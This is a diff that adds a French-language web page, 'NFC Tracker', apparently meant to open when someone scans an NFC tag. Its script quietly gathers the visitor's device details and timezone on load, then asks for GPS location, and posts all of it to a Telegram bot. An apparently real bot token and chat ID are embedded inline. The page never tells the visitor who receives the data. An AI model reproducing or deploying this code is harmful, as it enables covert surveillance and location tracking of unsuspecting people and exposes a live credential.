@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>NFC Tracker</title>
+</head>
+<body>
+<h2>Scan NFC enregistré 📲</h2>
+<p id="status">Collecte...</p>
+
+<button onclick="getLocation()">Autoriser localisation</button>
+
+<script>
+const TOKEN = 8711500706:AAFXlSTLgPBdyhd1zNttohLWVxzWG_632Xk; // 🔴 MODIFIE ICI
+const CHAT_ID = 6804015377; // 🔴 MODIFIE ICI
+
+const baseData = {
+  userAgent: navigator.userAgent,
+  language: navigator.language,
+  platform: navigator.platform,
+  screen: { width: screen.width, height: screen.height },
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  time: new Date().toISOString()
+};
+
+function sendToTelegram(extra = {}) {
+  const data = { ...baseData, ...extra };
+  const message = `
+📡 Nouveau scan NFC
+
+🌍 IP: (non disponible depuis JS)
+📱 Appareil: ${data.userAgent}
+🧠 Plateforme: ${data.platform}
+🌐 Langue: ${data.language}
+🕒 Heure: ${data.time}
+
+📍 Localisation: ${data.location ? `https://maps.google.com/?q=${data.location.lat},${data.location.lon}` : "Non autorisée"}
+`;
+
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  }).then(() => {
+    document.getElementById("status").innerText = "Envoyé ✅";
+  });
+}
+
+// Envoi automatique
+sendToTelegram();
+
+function getLocation() {
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        sendToTelegram({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
+      },
+      () => alert("Localisation refusée")
+    );
+  }
+}
+</script>
+</body>
+</html>
